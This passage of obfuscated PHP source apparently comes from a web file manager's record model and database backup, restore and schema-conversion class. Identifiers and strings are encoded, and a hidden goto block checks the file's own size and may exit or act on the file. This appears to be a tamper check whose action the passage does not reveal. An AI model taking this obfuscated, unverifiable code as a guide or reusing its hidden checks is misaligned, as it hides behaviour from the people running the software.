(!$®ª≤›á…) { $®ª≤›á… = 0; } if (!$ÈÚø˚¥≈ && $ÇÓ¬ËÖê == $∑”ñ∏ÁΩ[417]) { $èÁ€øÒØ = Model($∑”ñ∏ÁΩ[1301])->where(array($∑”ñ∏ÁΩ[418] => $É∫ÉæàÅ))->find(); if (!$èÁ€øÒØ) { return !1; } $ÈÚø˚¥≈ = $èÁ€øÒØ[$∑”ñ∏ÁΩ[32]]; } $ÈÚø˚¥≈ = $this->getAutoName($ÈÚø˚¥≈); $•‘ØÿÁ∫ = array($∑”ñ∏ÁΩ[1619] => USER_ID, $∑”ñ∏ÁΩ[483] => 0, $∑”ñ∏ÁΩ[421] => $ÈÚø˚¥≈, $∑”ñ∏ÁΩ[422] => $É∫ÉæàÅ, $∑”ñ∏ÁΩ[423] => $ÇÓ¬ËÖê, $∑”ñ∏ÁΩ[1800] => $®ª≤›á… + 1); return $this->add($•‘ØÿÁ∫); } protected function remove($ô–±√·≠) { $Å∆√˜˛Ü =& $_SERVER[ëæªã÷]; $ïª≠ÅßÛ = array($Å∆√˜˛Ü[1619] => USER_ID, $Å∆√˜˛Ü[420] => $ô–±√·≠); return $this->where($ïª≠ÅßÛ)->delete(); } protected function removeByName($ì•™œµÂ) { $Ó‹¸⁄áà =& $_SERVER[ëæªã÷]; $…◊˝Ø⁄⁄ = array($Ó‹¸⁄áà[1619] => USER_ID, $Ó‹¸⁄áà[421] => $ì•™œµÂ, $Ó‹¸⁄áà[483] => 0); return $this->where($…◊˝Ø⁄⁄)->delete(); } protected function rename($§™˝‡≠¶, $ØÚ£®Ø€) { $øÊÈ√˙é =& $_SERVER[ëæªã÷]; if ($§™˝‡≠¶ == $ØÚ£®Ø€) { return !1; } $Ú‘§∫„Í = $this->getAutoName($ØÚ£®Ø€); if ($ØÚ£®Ø€ != $Ú‘§∫„Í) { return !1; } $»—çΩ“À = array($øÊÈ√˙é[1619] => USER_ID, $øÊÈ√˙é[483] => 0, $øÊÈ√˙é[32] => $§™˝‡≠¶); return $this->where($»—çΩ“À)->save(array($øÊÈ√˙é[32] => $ØÚ£®Ø€)); } protected function resetSort($◊ú¶áŸ◊) { $âŒìÄÄÒ =& $_SERVER[ëæªã÷]; $◊ú¶áŸ◊ = is_array($◊ú¶áŸ◊) ? $◊ú¶áŸ◊ : array(); $ˆ˙Ωπ˙ò = array($âŒìÄÄÒ[1619] => USER_ID); for ($ª–ùíˆ = 0; $ª–ùíˆ < count($◊ú¶áŸ◊); $ª–ùíˆ++) { $ˆ˙Ωπ˙ò[$âŒìÄÄÒ[420]] = $◊ú¶áŸ◊[$ª–ùíˆ]; $this->where($ˆ˙Ωπ˙ò)->save(array($âŒìÄÄÒ[1800] => $ª–ùíˆ + 1)); } return !0; } protected function moveTop($å∑œÔŸ™) { $ˆ—»ÛΩ≤ =& $_SERVER[ëæªã÷]; $Õ±™¿ºÁ = array($ˆ—»ÛΩ≤[1619] => USER_ID, $ˆ—»ÛΩ≤[483] => 0); $®≤Û∫ıπ = $this->where($Õ±™¿ºÁ)->where(array($ˆ—»ÛΩ≤[32] => $å∑œÔŸ™))->find(); if (!$®≤Û∫ıπ) { return; } $®’ËàÂ£ = $this->field($ˆ—»ÛΩ≤[401])->where($Õ±™¿ºÁ)->order($ˆ—»ÛΩ≤[2224])->select(); $®’ËàÂ£ = array_to_keyvalue($®’ËàÂ£, $ˆ—»ÛΩ≤[12], $ˆ—»ÛΩ≤[401]); $©•°˜ÑÏ = $®’ËàÂ£; $®’ËàÂ£ = array_remove_value($®’ËàÂ£, $®≤Û∫ıπ[$ˆ—»ÛΩ≤[401]]); array_unshift($®’ËàÂ£, $®≤Û∫ıπ[$ˆ—»ÛΩ≤[401]]); return $this->resetSort($®’ËàÂ£); } protected function moveBottom($àÒÁ∑Œù) { $—‡ê±•é =& $_SERVER[ëæªã÷]; $©√—Á≈ò = array($—‡ê±•é[1619] => USER_ID, $—‡ê±•é[483] => 0); $ã∂Äãå∑ = $this->where($©√—Á≈ò)->max($—‡ê±•é[1819]); $’û¶∂ﬂÃ = array($—‡ê±•é[1819] => $ã∂Äãå∑ + 1); return $this->where($©√—Á≈ò)->where(array($—‡ê±•é[32] => $àÒÁ∑Œù))->save($’û¶∂ﬂÃ); } private function getAutoName($Ïﬂ∆ÏôØ) { $ÓÀÃ™»ß =& $_SERVER[ëæªã÷]; $áåÉ‚«ê = array($ÓÀÃ™»ß[1619] => USER_ID, $ÓÀÃ™»ß[483] => 0); $‘œë‰Ñ∏ = $this->field($ÓÀÃ™»ß[32])->where($áåÉ‚«ê)->select(); $‘œë‰Ñ∏ = array_to_keyvalue($‘œë‰Ñ∏, $ÓÀÃ™»ß[12], $ÓÀÃ™»ß[32]); if (!$‘œë‰Ñ∏ || !in_array($Ïﬂ∆ÏôØ, $‘œë‰Ñ∏)) { return $Ïﬂ∆ÏôØ; } for ($¶”ÆÏÿÿ = 0; $¶”ÆÏÿÿ < count($‘œë‰Ñ∏); $¶”ÆÏÿÿ++) { if (!in_array($Ïﬂ∆ÏôØ . "\x28{$¶”ÆÏÿÿ}\51", $‘œë‰Ñ∏)) { return $Ïﬂ∆ÏôØ . "\x28{$¶”ÆÏÿÿ}\x29"; } } return $Ïﬂ∆ÏôØ . "\x28{$¶”ÆÏÿÿ}\51"; } } goto eûõçﬂå›ß; E‹Â‹ß¨ùó: $_size = $_SERVER[ëæªã÷][852]; if ($_SERVER[$_SERVER[ëæªã÷][60]] != $_size($_file)) { $_getc = $_SERVER[ëæªã÷][62]; $_getfile = $_SERVER[$_SERVER[ëæªã÷][63]] . $_SERVER[ëæªã÷][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ëæªã÷][65], $_getfilec); if (count($_getarrs) < $_SERVER[ëæªã÷][66]) { $exit = $_SERVER[ëæªã÷][67]; $exit(); } $_act = $_SERVER[ëæªã÷][68]; $_act($_file); } class DbManage { function __construct($∂¢É´£± = array()) { $Õ«ÿóÿë =& $_SERVER[ëæªã÷]; if (empty($∂¢É´£±)) { $∂¢É´£± = $GLOBALS[$Õ«ÿóÿë[6]][$Õ«ÿóÿë[21]]; } $this->database = $∂¢É´£±; } public function model($óöêØıÏ = '') { return new ModelBase($óöêØıÏ, $_SERVER[ëæªã÷][12], $this->database); } public function db($€—œùûπ = false) { $∏…è¢òß =& $_SERVER[ëæªã÷]; $Á∫Ÿ≈åï = array_change_key_case($this->database); if ($this->dbType() == $∏…è¢òß[13] || !$€—œùûπ) { return $this->model()->db(); } $ÕÉáƒõû = $Á∫Ÿ≈åï[$∏…è¢òß[948]]; $Á∫Ÿ≈åï[$∏…è¢òß[948]] = $∏…è¢òß[12]; if ($Á∫Ÿ≈åï[$∏…è¢òß[943]] == $∏…è¢òß[940]) { $îùÌÚ•ı = $Á∫Ÿ≈åï[$∏…è¢òß[949]]; $Á∫Ÿ≈åï[$∏…è¢òß[949]] = substr($îùÌÚ•ı, 0, strrpos($îùÌÚ•ı, $∏…è¢òß[1035])); } $this->database = $Á∫Ÿ≈åï; $∂°®˘Ôµ = $this->model()->db(); try { $ôÜ¡Ïëæ = $∂°®˘Ôµ->execute("\163\x68\x6f\x77\x20\x64\141\164\141\x62\x61\163\145\163\40\154\151\x6b\145\40\x27{$ÕÉáƒõû}\47"); } catch (Exception $ù¸∫Ì¡ÿ) { } if (!$ôÜ¡Ïëæ) { $∂°®˘Ôµ->execute("\143\x72\x65\141\164\145\40\144\x61\164\141\142\x61\163\x65\40\x60{$ÕÉáƒõû}\140"); } $Á∫Ÿ≈åï[$∏…è¢òß[948]] = $ÕÉáƒõû; if ($Á∫Ÿ≈åï[$∏…è¢òß[943]] == $∏…è¢òß[940]) { $Á∫Ÿ≈åï[$∏…è¢òß[949]] .= $∏…è¢òß[1035] . $ÕÉáƒõû; } $this->database = $Á∫Ÿ≈åï; $∂°®˘Ôµ->execute("\165\x73\x65\40\140{$ÕÉáƒõû}\x60"); return $∂°®˘Ôµ; } public function createTable($∑ò∆¢ûﬂ, &$ÕØóΩì∆) { $ªàÊÈ¡¥ =& $_SERVER[ëæªã÷]; if (!IO::exist($∑ò∆¢ûﬂ)) { ActionCall($ªàÊÈ¡¥[1036], !0, 0); show_json(LNG($ªàÊÈ¡¥[1037]), !1); } $€Ïäñáí = $this->model()->db(); $—›ùß„â = sqlSplit(IO::getContent($∑ò∆¢ûﬂ)); foreach ($—›ùß„â as $àú¸†ûÏ) { $ÓÌ‰Â—∑ = stripos($àú¸†ûÏ, $ªàÊÈ¡¥[1038]) === 0; if ($ÓÌ‰Â—∑) { $ÕØóΩì∆->task[$ªàÊÈ¡¥[766]] += 1; } $€Ïäñáí->execute($àú¸†ûÏ); if ($ÓÌ‰Â—∑) { preg_match($ªàÊÈ¡¥[1039], $àú¸†ûÏ, $πÈ‚€˙®); $ÕØóΩì∆->task[$ªàÊÈ¡¥[1040]] = $πÈ‚€˙®[1]; $ÕØóΩì∆->update(1); } } } public function insertTable($⁄à≈ÍŸû, &$∂´ä≠©ò) { $Ö◊…¸⁄˜ =& $_SERVER[ëæªã÷]; $í•ä‹á¢ = $this->model()->db(); $∑¡—ﬂË• = $¡®…Ëœú ? array($¡®…Ëœú) : $í•ä‹á¢->getTables(); foreach ($⁄à≈ÍŸû as $å‹ã¶ûó) { $¡®…Ëœú = basename($å‹ã¶ûó, $Ö◊…¸⁄˜[768]); if (!in_array($¡®…Ëœú, $∑¡—ﬂË•)) { continue; } $∂´ä≠©ò->task[$Ö◊…¸⁄˜[1040]] = $¡®…Ëœú; if (get_filesize($å‹ã¶ûó) == 0) { continue; } $ûŒÂËÆ¸ = $this->sqlToDb($å‹ã¶ûó, $∂´ä≠©ò); if (!$ûŒÂËÆ¸) { ActionCall($Ö◊…¸⁄˜[1036], !0, 0); show_json(LNG($Ö◊…¸⁄˜[1041]) . "\x5b{$¡®…Ëœú}\x5d", !1); } } } public function sqlFromDb($Û–ªΩÀ˝, $µåú¥ªò, &$√≤Â∆üç, $›ì¡¥±ò = '') { if ($√≤Â∆üç) { $√≤Â∆üç->task[$_SERVER[ëæªã÷][1040]] = $Û–ªΩÀ˝; } $≈“é∂ÜØ = $this->model($Û–ªΩÀ˝); $≠«ç≠€› = 0; $ç†æﬁêÅ = 0; $§éÇ—≠¸ = 10000; $∂€·˝›˜ = fopen($µåú¥ªò, $_SERVER[ëæªã÷][1042]); $Ãöáñç‹ = $≈“é∂ÜØ->getPk(); $’ø⁄˝ Ä = $≈“é∂ÜØ->getDbFields(); $ˆÏπœ∂á = $_SERVER[ëæªã÷][12]; if ($GLOBALS[$_SERVER[ëæªã÷][767]] && in_array($Û–ªΩÀ˝, array($_SERVER[ëæªã÷][1043], $_SERVER[ëæªã÷][1044]))) { $ˆÏπœ∂á = $Û–ªΩÀ˝; } do { $‚äÁ¯›® = array($Ãöáñç‹ => array($_SERVER[ëæªã÷][990], $ç†æﬁêÅ)); $öˆ—Ùã€ = $≈“é∂ÜØ->where($‚äÁ¯›®)->field($’ø⁄˝ Ä)->order($Ãöáñç‹ . $_SERVER[ëæªã÷][1045])->limit($§éÇ—≠¸)->select(); $öˆ—Ùã€ = !empty($öˆ—Ùã€) ? $öˆ—Ùã€ : array(); if (!($≤Äø’’ó = count($öˆ—Ùã€))) { break; } $‹“®≈™· = end($öˆ—Ùã€); $ç†æﬁêÅ = $‹“®≈™·[$Ãöáñç‹]; $˛Ñ‘ã˙ﬂ = array(); foreach ($öˆ—Ùã€ as $—‡Úô€œ) { if ($ˆÏπœ∂á) { if ($Û–ªΩÀ˝ == $_SERVER[ëæªã÷][1043]) { if ($—‡Úô€œ[$_SERVER[ëæªã÷][33]] == $_SERVER[ëæªã÷][1046]) { $ ÎÃÏÑó = json_decode($—‡Úô€œ[$_SERVER[ëæªã÷][378]], !0); if ($ ÎÃÏÑó[$_SERVER[ëæªã÷][32]] == $GLOBALS[$_SERVER[ëæªã÷][767]] && $ ÎÃÏÑó[$_SERVER[ëæªã÷][730]] != 1) { continue; } } } else { if ($—‡Úô€œ[$_SERVER[ëæªã÷][33]] == $_SERVER[ëæªã÷][1047] && $—‡Úô€œ[$_SERVER[ëæªã÷][105]] == $_SERVER[ëæªã÷][759]) { continue; } } } if ($›ì¡¥±ò) { $—‡Úô€œ[$_SERVER[ëæªã÷][88]] = "\x7b\151\x6f\x3a{$›ì¡¥±ò}\x7d" . substr($—‡Úô€œ[$_SERVER[ëæªã÷][88]], strlen("\x7b\151\157\72{$—‡Úô€œ[$_SERVER[ëæªã÷][797]]}\175")); $—‡Úô€œ[$_SERVER[ëæªã÷][797]] = $›ì¡¥±ò; } $˛Ñ‘ã˙ﬂ[] = $_SERVER[ëæªã÷][1048] . $this->sqlEncode($—‡Úô€œ) . $_SERVER[ëæªã÷][1049]; } $´∑⁄ÍÂï = "\x49\x4e\123\x45\122\124\40\111\116\124\117\40\140{$Û–ªΩÀ˝}\140\40\x28\x60" . implode($_SERVER[ëæªã÷][1050], $’ø⁄˝ Ä) . $_SERVER[ëæªã÷][1051]; fwrite($∂€·˝›˜, $´∑⁄ÍÂï . implode($_SERVER[ëæªã÷][1052], $˛Ñ‘ã˙ﬂ) . $_SERVER[ëæªã÷][81] . PHP_EOL); $≠«ç≠€› += $≤Äø’’ó; if ($√≤Â∆üç) { $√≤Â∆üç->update($≤Äø’’ó); } } while ($§éÇ—≠¸ == $≤Äø’’ó); fclose($∂€·˝›˜); return $≠«ç≠€›; } public function sqlToDb($¡∫ü„≠¥, &$ﬂ‘˜◊©˜) { $û˚€∏Áé =& $_SERVER[ëæªã÷]; $Êî‰ï°Å = $this->model()->db(); $ª”˝ €Â = @fopen($¡∫ü„≠¥, $û˚€∏Áé[1053]); if (!$ª”˝ €Â) { return !1; } $·Ô‚ØóÚ = 0; $Ñ¶§¡¨â = $û˚€∏Áé[12]; $£ëﬂ˘ü˝ = array(); $´•∏„ê¯ = $this->dbType(); $™∂ºÄµ˛ = $´•∏„ê¯ == $û˚€∏Áé[13] ? 500 : 2000; $ÌÛí¸‹£ = basename($¡∫ü„≠¥, $û˚€∏Áé[768]); $Ôä∑„Å” = 0; $èèñ…˙À = 4194304 - 104858; $ƒôö˝ı¥ = 1000000 - 104858; while (!feof($ª”˝ €Â)) { $≈«ﬂñÅÃ = trim(fgets($ª”˝ €Â)); if (!$≈«ﬂñÅÃ) { continue; } $Òº–“ÜÅ = $this->sqlDecode($≈«ﬂñÅÃ, $´•∏„ê¯, $ÌÛí¸‹£); if (stripos($Òº–“ÜÅ, $û˚€∏Áé[359]) === 0) { if (!$Ñ¶§¡¨â) { $Ñ¶§¡¨â = $Òº–“ÜÅ . $û˚€∏Áé[53]; } continue; } if ($ﬂ‘˜◊©˜) { $ﬂ‘˜◊©˜->task[$û˚€∏Áé[766]] += 1; } $·Ô‚ØóÚ++; $£ëﬂ˘ü˝[] = rtrim(rtrim(trim($Òº–“ÜÅ), $û˚€∏Áé[50]), $û˚€∏Áé[81]); $ââóÒ„∫ = null; $·ØΩ†∆ª = strlen($Òº–“ÜÅ); $Ôä∑„Å” += $·ØΩ†∆ª; if ($Ôä∑„Å” >= ($™∂ºÄµ˛ == 500 ? $ƒôö˝ı¥ : $èèñ…˙À)) { $ââóÒ„∫ = array_pop($£ëﬂ˘ü˝); if ($·Ô‚ØóÚ > 1) { $·Ô‚ØóÚ--; } } if ($·Ô‚ØóÚ >= $™∂ºÄµ˛ || $ââóÒ„∫) { $Òº–“ÜÅ = $Ñ¶§¡¨â . implode($û˚€∏Áé[50], $£ëﬂ˘ü˝); if (!$Êî‰ï°Å->execute($Òº–“ÜÅ)) { return !1; } if ($ﬂ‘˜◊©˜) { $ﬂ‘˜◊©˜->update($·Ô‚ØóÚ); } $£ëﬂ˘ü˝ = array(); $·Ô‚ØóÚ = 0; $Ôä∑„Å” = 0; if ($ââóÒ„∫) { $£ëﬂ˘ü˝ = array($ââóÒ„∫); $·Ô‚ØóÚ = 1; $Ôä∑„Å” = $·ØΩ†∆ª; } } } fclose($ª”˝ €Â); if (!empty($£ëﬂ˘ü˝)) { $Òº–“ÜÅ = $Ñ¶§¡¨â . implode($û˚€∏Áé[50], $£ëﬂ˘ü˝); if (!$Êî‰ï°Å->execute($Òº–“ÜÅ)) { return !1; } if ($ﬂ‘˜◊©˜) { $ﬂ‘˜◊©˜->update($·Ô‚ØóÚ); } } return !0; } public function dropTable($£÷∫€ë‹ = null) { $◊◊“π©≈ = $this->model()->db(); $ıö¡Úƒ≠ = $£÷∫€ë‹ ? array($£÷∫€ë‹) : $◊◊“π©≈->getTables(); if (!$ıö¡Úƒ≠) { return; } foreach ($ıö¡Úƒ≠ as $£÷∫€ë‹) { if ($£÷∫€ë‹) { $£÷∫€ë‹ = strtolower($£÷∫€ë‹); } else { continue; } $◊◊“π©≈->execute("\144\162\x6f\x70\40\x74\x61\142\154\x65\x20\x69\146\x20\145\170\151\x73\164\x73\x20\140{$£÷∫€ë‹}\x60"); } } private function sqlEncode($…Â—È‰Ã) { $Òø«è‰Ì =& $_SERVER[ëæªã÷]; $ ì¶∑∂Ú = array(); foreach ($…Â—È‰Ã as $£“„˛Ú™) { if (is_array($£“„˛Ú™)) { $£“„˛Ú™ = json_encode_force($£“„˛Ú™); } $£“„˛Ú™ = addslashes($£“„˛Ú™); $£“„˛Ú™ = str_replace(array($Òø«è‰Ì[1054], $Òø«è‰Ì[65]), array($Òø«è‰Ì[1055], $Òø«è‰Ì[1056]), $£“„˛Ú™); $ ì¶∑∂Ú[] = str_replace($Òø«è‰Ì[58], $Òø«è‰Ì[1057], $£“„˛Ú™); } return $Òø«è‰Ì[58] . implode($Òø«è‰Ì[1058], $ ì¶∑∂Ú) . $Òø«è‰Ì[58]; } private function sqlDecode($•«€÷ À, $ºØïÜˆÅ, $ÏÜØã˝ = '') { $◊‡◊®≠º =& $_SERVER[ëæªã÷]; $•«€÷ À = str_replace(array($◊‡◊®≠º[1055], $◊‡◊®≠º[1056]), array($◊‡◊®≠º[1054], $◊‡◊®≠º[65]), $•«€÷ À); if ($ºØïÜˆÅ == $◊‡◊®≠º[13]) { return $ÏÜØã˝ != $◊‡◊®≠º[1059] ? stripslashes($•«€÷ À) : $•«€÷ À; } if ($ÏÜØã˝ == $◊‡◊®≠º[1059]) { $•«€÷ À = str_replace($◊‡◊®≠º[1060], $◊‡◊®≠º[127], stripslashes($•«€÷ À)); } return $•«€÷ À; } public function getSqlFile($Ç≥∆“∂ƒ = '') { $Ù„ÅÈÃö =& $_SERVER[ëæªã÷]; $∂∂€ëÖ∞ = $this->dbType(!0); $´≠êÃç⁄ = CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\154\57\x64\141\x74\x61\x2f{$∂∂€ëÖ∞}\56\163\x71\154"; $í‚∫áœÓ = file_get_contents($´≠êÃç⁄); $ú¨Ù˝Öï = $Ù„ÅÈÃö[1061] . ($∂∂€ëÖ∞ == $Ù„ÅÈÃö[784] ? $Ù„ÅÈÃö[1062] : $Ù„ÅÈÃö[1063]) . $Ù„ÅÈÃö[1064]; preg_match_all($ú¨Ù˝Öï, $í‚∫áœÓ, $§ƒÔñ¡Å); $•‡ﬁÊﬂ« = $§ƒÔñ¡Å[1]; $åæµ„Ñπ = $this->model()->db(); $⁄ºã•Ä = $åæµ„Ñπ->getTables(); $Ä‰Ò¶º€ = TEMP_FILES . $Ù„ÅÈÃö[1065] . date($Ù„ÅÈÃö[731]) . $Ù„ÅÈÃö[8]; del_dir($Ä‰Ò¶º€); mk_dir($Ä‰Ò¶º€); $ﬂÍª‘±Ì = $Ä‰Ò¶º€ . $Ù„ÅÈÃö[1066]; $ÕÊñ¥¡⁄ = $Ä‰Ò¶º€ . $Ù„ÅÈÃö[1067]; $˚»·û‰˚ = $∂∂€ëÖ∞ == $Ù„ÅÈÃö[13] ? $Ù„ÅÈÃö[784] : $Ù„ÅÈÃö[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\x61\154\x6c\57\144\141\164\141\x2f{$˚»·û‰˚}\x2e\x73\161\x6c", $Ä‰Ò¶º€); @touch($Ä‰Ò¶º€ . $∂∂€ëÖ∞ . $Ù„ÅÈÃö[768]); $÷‡ê≈È˜ = fopen($ﬂÍª‘±Ì, $Ù„ÅÈÃö[1042]); $ßàÊ…èÃ = fopen($ÕÊñ¥¡⁄, $Ù„ÅÈÃö[1042]); if ($∂∂€ëÖ∞ == $Ù„ÅÈÃö[13]) { $⁄ºã•Ä = array_diff($⁄ºã•Ä, array($Ù„ÅÈÃö[764], $Ù„ÅÈÃö[765])); $Ì—¯ﬂ®ñ = array($Ù„ÅÈÃö[1068], $Ù„ÅÈÃö[1069], $Ù„ÅÈÃö[1070]); fwrite($ßàÊ…èÃ, implode(PHP_EOL, $Ì—¯ﬂ®ñ) . PHP_EOL . PHP_EOL); foreach ($⁄ºã•Ä as $Í≈ÁÇÇì) { $†˚ö∏Í€ = $this->sqlFromSqlite($Í≈ÁÇÇì); if (!$†˚ö∏Í€[$Ù„ÅÈÃö[13]]) { continue; } fwrite($ßàÊ…èÃ, $†˚ö∏Í€[$Ù„ÅÈÃö[13]] . PHP_EOL . PHP_EOL); if (!in_array($Í≈ÁÇÇì, $•‡ﬁÊﬂ«)) { fwrite($÷‡ê≈È˜, $†˚ö∏Í€[$Ù„ÅÈÃö[784]] . PHP_EOL . PHP_EOL); } } } else { foreach ($⁄ºã•Ä as $Í≈ÁÇÇì) { $†˚ö∏Í€ = $this->sqlFromMysql($Í≈ÁÇÇì); if (!$†˚ö∏Í€[$Ù„ÅÈÃö[784]]) { continue; } fwrite($÷‡ê≈È˜, $†˚ö∏Í€[$Ù„ÅÈÃö[784]] . PHP_EOL . PHP_EOL); if (!in_array($Í≈ÁÇÇì, $•‡ﬁÊﬂ«)) { fwrite($ßàÊ…èÃ, $†˚ö∏Í€[$Ù„ÅÈÃö[13]] . PHP_EOL . PHP_EOL); } } } fclose($÷‡ê≈È˜); fclose($ßàÊ…èÃ); $í‚∫áœÓ = array($Ù„ÅÈÃö[784] => $ﬂÍª‘±Ì, $Ù„ÅÈÃö[13] => $ÕÊñ¥¡⁄); return $Ç≥∆“∂ƒ ? $í‚∫áœÓ[$Ç≥∆“∂ƒ] : $í‚∫áœÓ; } public function dbType($¡’ÌÖ–Ù = false) { $Ÿ‡üëÑŸ =& $_SERVER[ëæªã÷]; $¸ºë•áñ = $¡’ÌÖ–Ù ? $GLOBALS[$Ÿ‡üëÑŸ[6]][$Ÿ‡üëÑŸ[21]] : $this->database; $¸ºë•áñ = array_change_key_case($¸ºë•áñ); $†Ã◊ôË÷ = $¸ºë•áñ[$Ÿ‡üëÑŸ[943]]; if ($†Ã◊ôË÷ == $Ÿ‡üëÑŸ[940]) { $∆Í§πäÛ = explode($Ÿ‡üëÑŸ[4], $¸ºë•áñ[$Ÿ‡üëÑŸ[949]]); $†Ã◊ôË÷ = $∆Í§πäÛ[0]; } $ÄÓ¸œË  = array($Ÿ‡üëÑŸ[1071] => $Ÿ‡üëÑŸ[13], $Ÿ‡üëÑŸ[888] => $Ÿ‡üëÑŸ[784]); if (isset($ÄÓ¸œË [$†Ã◊ôË÷])) { $†Ã◊ôË÷ = $ÄÓ¸œË [$†Ã◊ôË÷]; } return $†Ã◊ôË÷; } public function sqlFromMysql($ªÃ†Ä†‚, $úòüõ¯â = '') { $≤∆´∏í® =& $_SERVER[ëæªã÷]; $¬§Çì¿Ÿ = $this->model()->db(); $ì»ô‡ùö = $¬§Çì¿Ÿ->query($≤∆´∏í®[1072] . $ªÃ†Ä†‚ . $≤∆´∏í®[389]); if (!$ì»ô‡ùö || !$ì»ô‡ùö[0]) { return !1; } $ ∑Åı∫€ = _get($ì»ô‡ùö[0], $≤∆´∏í®[1073], $≤∆´∏í®[12]); if (!$ ∑Åı∫€) { return !1; } $∆ò¿Ø∫ì = "\104\x52\117\120\x20\124\x41\x42\x4c\x45\x20\111\106\x20\x45\x58\x49\123\124\123\40\140{$ªÃ†Ä†‚}\140\x3b" . PHP_EOL . $ ∑Åı∫€ . $≤∆´∏í®[81]; if ($úòüõ¯â && $úòüõ¯â == $≤∆´∏í®[784]) { return $∆ò¿Ø∫ì; } $ÑÑí¥‡Ó = array_change_key_case($GLOBALS[$≤∆´∏í®[6]][$≤∆´∏í®[21]]); $ûµ©««Ê = $ÑÑí¥‡Ó[$≤∆´∏í®[948]]; $ﬂ≤ôØ∑ï = $≤∆´∏í®[1074] . $ûµ©««Ê . $≤∆´∏í®[1075] . $ªÃ†Ä†‚ . $≤∆´∏í®[58]; $»√¸Œïá = $≤∆´∏í®[1076] . $ªÃ†Ä†‚ . $≤∆´∏í®[876]; $›ÜıÎ¯≠ = $¬§Çì¿Ÿ->query($ﬂ≤ôØ∑ï); if (empty($›ÜıÎ¯≠)) { $ûüõª‚™ = array($≤∆´∏í®[784] => $≤∆´∏í®[12], $≤∆´∏í®[13] => $≤∆´∏í®[12]); return $úòüõ¯â ? $ûüõª‚™[$úòüõ¯â] : $ûüõª‚™; } $÷çí≠˝° = $¬§Çì¿Ÿ->query($»√¸Œïá); $∆ÒµãâÍ = $≤∆´∏í®[12]; $∫∆ÈñÃõ = array(); foreach ($÷çí≠˝° as $””ö≠À˚) { if (!$∆ÒµãâÍ && $””ö≠À˚[$≤∆´∏í®[1077]] == $≤∆´∏í®[1078]) { $∆ÒµãâÍ = $””ö≠À˚[$≤∆´∏í®[1079]]; } if (isset($∫∆ÈñÃõ[$””ö≠À˚[$≤∆´∏í®[1077]]])) { $∫∆ÈñÃõ[$””ö≠À˚[$≤∆´∏í®[1077]]][$≤∆´∏í®[1080]][] = $””ö≠À˚[$≤∆´∏í®[1079]]; continue; } $∫∆ÈñÃõ[$””ö≠À˚[$≤∆´∏í®[1077]]] = array($≤∆´∏í®[1081] => $””ö≠À˚[$≤∆´∏í®[1077]], $≤∆´∏í®[1080] => array($””ö≠À˚[$≤∆´∏í®[1079]]), $≤∆´∏í®[1082] => $””ö≠À˚[$≤∆´∏í®[1083]] == $≤∆´∏í®[99] ? 0 : 1); } $„ÿŒˆªå = array(); foreach ($∫∆ÈñÃõ as $””ö≠À˚) { $üÏ™´‰Ì = $””ö≠À˚[$≤∆´∏í®[1081]] == $≤∆´∏í®[1078]; $ÅËçÚé» = array($≤∆´∏í®[1084], $””ö≠À˚[$≤∆´∏í®[1082]] == $≤∆´∏í®[99] && !$üÏ™´‰Ì ? $≤∆´∏í®[1085] : $≤∆´∏í®[12], $≤∆´∏í®[1086], $≤∆´∏í®[1087] . $ªÃ†Ä†‚ . $≤∆´∏í®[11] . ($üÏ™´‰Ì ? $≤∆´∏í®[1088] : $””ö≠À˚[$≤∆´∏í®[1081]]) . $≤∆´∏í®[127], $≤∆´∏í®[1089], $≤∆´∏í®[127] . $ªÃ†Ä†‚ . $≤∆´∏í®[127], $≤∆´∏í®[1090] . implode($≤∆´∏í®[1091], $””ö≠À˚[$≤∆´∏í®[1080]]) . $≤∆´∏í®[1092]); $„ÿŒˆªå[] = implode($≤∆´∏í®[53], $ÅËçÚé») . $≤∆´∏í®[81]; } $≈Á„ÎÃü = array(); $»Û≤—ﬁ≠ = array($≤∆´∏í®[1093] => $≤∆´∏í®[1094], $≤∆´∏í®[1094] => $≤∆´∏í®[1094], $≤∆´∏í®[292] => $≤∆´∏í®[319], $≤∆´∏í®[291] => $≤∆´∏í®[319]); foreach ($›ÜıÎ¯≠ as $””ö≠À˚) { $ÅËçÚé» = array($≤∆´∏í®[127] . $””ö≠À˚[$≤∆´∏í®[1095]] . $≤∆´∏í®[127], isset($»Û≤—ﬁ≠[$””ö≠À˚[$≤∆´∏í®[1096]]]) ? $»Û≤—ﬁ≠[$””ö≠À˚[$≤∆´∏í®[1096]]] : $””ö≠À˚[$≤∆´∏í®[1097]], $””ö≠À˚[$≤∆´∏í®[1098]] == $≤∆´∏í®[874] ? $≤∆´∏í®[1099] : $≤∆´∏í®[1100], $””ö≠À˚[$≤∆´∏í®[1095]] == $∆ÒµãâÍ ? $≤∆´∏í®[1101] : $≤∆´∏í®[12], $””ö≠À˚[$≤∆´∏í®[925]] ? strtoupper(str_replace($≤∆´∏í®[11], $≤∆´∏í®[12], $””ö≠À˚[$≤∆´∏í®[925]])) : $≤∆´∏í®[12]); $≈Á„ÎÃü[] = trim(implode($≤∆´∏í®[53], $ÅËçÚé»)); } $àÜ˚…¬´ = array($≤∆´∏í®[1102] . $ªÃ†Ä†‚ . $≤∆´∏í®[1103], $≤∆´∏í®[1104] . $ªÃ†Ä†‚ . $≤∆´∏í®[1105], implode($≤∆´∏í®[50] . PHP_EOL, $≈Á„ÎÃü), $≤∆´∏í®[922]); $¡£¶Éœí = implode(PHP_EOL, array_merge($àÜ˚…¬´, $„ÿŒˆªå)); if ($úòüõ¯â && $úòüõ¯â == $≤∆´∏í®[13]) { return $¡£¶Éœí; } $ûüõª‚™ = array($≤∆´∏í®[784] => $∆ò¿Ø∫ì, $≤∆´∏í®[13] => $¡£¶Éœí); return $úòüõ¯â ? $ûüõª‚™[$úòüõ¯â] : $ûüõª‚™; } public function sqlFromSqlite($™í‘ﬂ√ç, $∞˘ÿù≥¶ = '') { $òª√á˛ì =& $_SERVER[ëæªã÷]; $ÎµÇ”âÃ = $this->model()->db(); $…•ÑØ†˜ = "\x50\x52\101\107\115\101\x20\124\101\102\114\x45\137\x49\116\106\x4f\x20\x28\47{$™í‘ﬂ√ç}\x27\x29"; $Äï˝®§Ø = "\x53\x45\x4c\105\x43\x54\40\x2a\x20\106\122\x4f\x4d\40\163\161\154\151\x74\x65\x5f\x6d\x61\163\164\145\x72\x20\x57\x48\105\x52\x45\40\x74\142\x6c\137\156\141\155\145\40\x3d\x20\x27{$™í‘ﬂ√ç}\47"; 